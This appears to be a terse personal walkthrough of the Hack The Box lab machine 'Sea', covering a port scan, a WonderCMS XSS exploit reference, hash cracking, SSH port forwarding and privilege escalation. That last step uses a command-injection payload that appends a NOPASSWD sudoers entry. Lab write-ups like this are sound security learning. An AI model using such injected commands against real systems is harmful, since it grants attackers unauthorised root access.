+++
title = "HTB - Sea"
date = 2024-10-08
+++

### Scan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sea - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Enum
80 - Apache 2.4.41
	Contact.php potential?
	Very thorough with dir enum. README.enum
	WonderCMS Bike Theme 3.2.0 - XSS https://github.com/insomnia-jacob/CVE-2023-41425.git
	Validate main index login
	break down how works
	Once done, use exploit
	
### Initial Access
stable shell
root around www data and dump js database
we get hash. for whatever the fuck reason, remove backslashes and crack with john.
login to amay ssh with password `mychemicalromance`
USER:59988bcea1fb845cc8c4eac8acd962cb


serve linpeas cuz all the shit gotdamn locked

### Privilege Escalation
netstat and/or linpeas
make note of 8080, or http-alt. must be web service
port forward `ssh -v -N -L 8888:localhost:8080 amay@sea.htb`
login with same creds
proxy thru burp to play with file analysis tool. Information leak here
Command Injection<img alt="Image" async src="images/Screenshot 2024-10-08 at 11.17.26 AM.png" width="800px"></img>
Lets give our user root priv `/etc/passwd+%26%26+echo+"amay+ALL=(ALL)+NOPASSWD:+ALL"+>+/etc/sudoers.d/amay+#`
success<img alt="Image" async src="images/Screenshot 2024-10-08 at 11.19.23 AM.png" width="800px"></img>
sudo -i to upgrade shell!
Root:62abbfcbb2ade98a7e550bdaf9b839c5
